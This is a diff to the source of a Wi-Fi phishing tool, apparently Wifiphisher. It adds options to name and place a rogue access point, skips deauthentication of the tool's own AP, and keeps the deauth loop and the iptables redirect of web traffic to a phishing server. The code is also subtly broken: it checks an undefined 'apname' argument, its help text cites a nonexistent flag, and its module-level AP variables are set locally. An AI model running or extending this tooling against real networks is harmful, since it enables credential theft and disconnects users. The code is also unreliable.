@@ -18,6 +18,7 @@ import phishingpage
 import phishinghttp
 import macmatcher
 import interfaces
+import pyric.pyw as pyric
 from constants import *
 
 VERSION = "1.1GIT"
@@ -32,6 +33,8 @@ terminate = False
 lock = Lock()
 args = 0
 mon_MAC = 0
+ap_interface = None
+ap_mac = None
 
 def parse_args():
     # Create the arguments
@@ -39,9 +42,9 @@ def parse_args():
     parser.add_argument(
         "-c",
         "--channel",
-        help="Choose the channel for monitoring. Default is channel 1",
-        default="1"
-    )
+        help=("Choose the channel for rouge AP. Must be used in conjunction "
+              "with -aN. Example: -aN hello -c 2"))
+
     parser.add_argument(
         "-s",
         "--skip",
@@ -122,6 +125,12 @@ def parse_args():
         "--presharedkey",
         help=("Add WPA/WPA2 protection on the rogue Access Point"))
 
+    parser.add_argument(
+        "-e",
+        "--essid",
+        help=("Set the name for the rouge access point.Must be used in "
+              "conjunction with -c. Example: -aN hello -c 2"))
+
     return parser.parse_args()
 
 def check_args(args):
@@ -129,6 +138,10 @@ def check_args(args):
     (len(args.presharedkey) < 8 \
     or len(args.presharedkey) > 64):
         sys.exit('[' + R + '-' + W + '] Pre-shared key must be between 8 and 63 printable characters.')
+
+    if (not args.apname and args.channel) or (args.apname and not args.channel):
+        sys.exit("[" + R + "-" + W + "] You need to provide --essid with" +
+                 " --channel")
 
 def stopfilter(x):
     if not sniff_daemon_running:
@@ -448,39 +461,32 @@ def channel_hop2(mon_iface):
     channelNum = 0
 
     while 1:
-        if args.channel:
+        channelNum += 1
+        if channelNum > 11:
+            channelNum = 1
             with lock:
-                monchannel = args.channel
-        else:
-            channelNum += 1
-            if channelNum > 11:
-                channelNum = 1
-                with lock:
-                    first_pass = 0
-            with lock:
-                monchannel = str(channelNum)
+                first_pass = 0
+        with lock:
+            monchannel = str(channelNum)
 
-            proc = Popen(
-                ['iw', 'dev', mon_iface, 'set', 'channel', monchannel],
-                stdout=DN,
-                stderr=PIPE
-            )
+        proc = Popen(
+            ['iw', 'dev', mon_iface, 'set', 'channel', monchannel],
+            stdout=DN,
+            stderr=PIPE
+        )
 
-            for line in proc.communicate()[1].split('\n'):
-                if len(line) > 2:
-                    # iw dev shouldnt display output unless there's an error
-                    err = ('[' + R + '-' + W + '] Channel hopping failed: '
-                           + R + line + W)
-                    sys.exit(err)
+        for line in proc.communicate()[1].split('\n'):
+            if len(line) > 2:
+                # iw dev shouldnt display output unless there's an error
+                err = ('[' + R + '-' + W + '] Channel hopping failed: '
+                       + R + line + W)
+                sys.exit(err)
 
         output(monchannel)
-        if args.channel:
-            time.sleep(.05)
-        else:
-            # For the first channel hop thru, do not deauth
-            if first_pass == 1:
-                time.sleep(1)
-                continue
+        # For the first channel hop thru, do not deauth
+        if first_pass == 1:
+            time.sleep(1)
+            continue
 
         deauth(monchannel)
 
@@ -624,9 +630,13 @@ def cb(pkt):
                     if args.accesspoint not in [pkt.addr1, pkt.addr2]:
                         return
 
+                # don't deauth our own AP
+                if ap_mac in [pkt.addr1, pkt.addr2]:
+                    return
+
                 # Check if it's added to our AP list
                 if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
-                    APs_add(clients_APs, APs, pkt, args.channel)
+                    APs_add(clients_APs, APs, pkt)
 
                 # Ignore all the noisy packets like spanning tree
                 if noise_filter(args.skip, pkt.addr1, pkt.addr2):
@@ -637,7 +647,7 @@ def cb(pkt):
                     clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)
 
 
-def APs_add(clients_APs, APs, pkt, chan_arg):
+def APs_add(clients_APs, APs, pkt):
     ssid = pkt[Dot11Elt].info
     bssid = pkt[Dot11].addr3
     try:
@@ -647,10 +657,6 @@ def APs_add(clients_APs, APs, pkt, chan_arg):
         chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
         if ap_channel not in chans:
             return
-
-        if chan_arg:
-            if ap_channel != chan_arg:
-                return
 
     except Exception:
         return
@@ -861,6 +867,7 @@ def run():
     # to monitor mode. shutdown on any errors
     try:
         mon_iface, ap_iface = network_manager.get_interfaces()
+        ap_interface = ap_iface
 
         kill_interfering_procs()
 
@@ -887,6 +894,10 @@ def run():
     # add the selected interfaces to the used list
     used_interfaces = [mon_iface, ap_iface]
 
+    # get the mac address for AP interface
+    card = pyric.getcard(ap_interface)
+    ap_mac = pyric.macget(card)
+
     # Set iptable rules and kernel variables.
     os.system(
         ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s'
@@ -912,15 +923,17 @@ def run():
 
     print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
 
-    # Copy AP
-    time.sleep(3)
-    hop = Thread(target=channel_hop, args=(mon_iface,))
-    hop.daemon = True
-    hop.start()
-    sniffing(mon_iface, targeting_cb)
-    channel, essid, ap_mac = copy_AP()
-    hop_daemon_running = False
-
+    if args.essid and args.channel:
+        channel, essid = args.channel, args.essid
+    else:
+        # Copy AP
+        time.sleep(3)
+        hop = Thread(target=channel_hop, args=(mon_iface,))
+        hop.daemon = True
+        hop.start()
+        sniffing(mon_iface, targeting_cb)
+        channel, essid, ap_mac = copy_AP()
+        hop_daemon_running = False
     # get the correct template
     template = select_template(args.template)
 
@@ -1023,8 +1036,10 @@ def run():
 
     clients_APs = []
     APs = []
-    args.accesspoint = ap_mac
-    args.channel = channel
+
+    if not (args.essid and args.channel):
+        args.accesspoint = ap_mac
+
     monitor_on = None
     conf.iface = mon_iface
     mon_MAC = mon_mac(mon_iface)
